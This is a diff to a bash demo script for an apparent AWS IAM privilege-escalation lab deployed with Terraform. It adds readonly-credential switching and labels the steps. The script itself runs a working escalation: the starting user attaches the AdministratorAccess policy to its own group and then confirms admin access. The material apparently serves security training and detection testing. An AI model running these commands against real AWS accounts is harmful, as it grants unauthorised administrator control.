@@ -11,6 +11,7 @@ export AWS_PAGER=""
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
 # Dim color for command display
@@ -55,24 +56,55 @@ if [ -z "$MODULE_OUTPUT" ]; then
 fi
 
 # Extract credentials and group name
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 GROUP_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.group_name')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
+if [ -z "$AWS_REGION" ]; then
+    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
+    AWS_REGION="us-east-1"
+fi
+
+echo "Retrieved access key for: $STARTING_USER"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
+echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
 
 cd - > /dev/null  # Return to scenario directory
 
-# Step 2: Verify identity
-echo -e "${YELLOW}Step 2: Verifying identity${NC}"
-unset AWS_SESSION_TOKEN
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
 
-# Verify starting user identity
+# [EXPLOIT] Step 2: Verify starting user identity
+echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
+
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -83,15 +115,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Check current permissions (should be limited)
+# [EXPLOIT] Step 4: Check current permissions (should be limited)
 echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
+use_starting_creds
 echo "Attempting to list S3 buckets (should fail)..."
 show_cmd "Attacker" "aws s3 ls"
 if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
@@ -101,8 +135,9 @@ else
 fi
 echo ""
 
-# Step 5: Verify group membership
+# [EXPLOIT] Step 5: Verify group membership
 echo -e "${YELLOW}Step 5: Verifying group membership${NC}"
+use_starting_creds
 show_cmd "Attacker" "aws iam list-groups-for-user --user-name $STARTING_USER --query 'Groups[*].GroupName' --output text"
 USER_GROUPS=$(aws iam list-groups-for-user --user-name $STARTING_USER --query 'Groups[*].GroupName' --output text)
 echo "User is member of groups: $USER_GROUPS"
@@ -114,8 +149,9 @@ else
     exit 1
 fi
 
-# Step 6: Attach AdministratorAccess policy to the group
+# [EXPLOIT] Step 6: Attach AdministratorAccess policy to the group
 echo -e "${YELLOW}Step 6: Attaching AdministratorAccess policy to group${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector..."
 
 ADMIN_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"
@@ -132,15 +168,16 @@ echo -e "${GREEN}✓ Successfully attached admin policy to group${NC}\n"
 echo -e "${GREEN}✓ Sleeping for 15 seconds to let the policy propagate${NC}\n"
 sleep 15
 
-# Step 7: Verify admin access
+# [OBSERVATION] Step 7: Verify admin access
 echo -e "${YELLOW}Step 7: Verifying administrator access${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
 # Test admin permissions
 echo "Testing admin permissions (listing IAM users)..."
-show_cmd "Attacker" "aws iam list-users --query 'Users[*].UserName' --output text"
+show_cmd "ReadOnly" "aws iam list-users --query 'Users[*].UserName' --output text"
 IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head -5)
 echo "Successfully listed IAM users: $IAM_USERS"
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
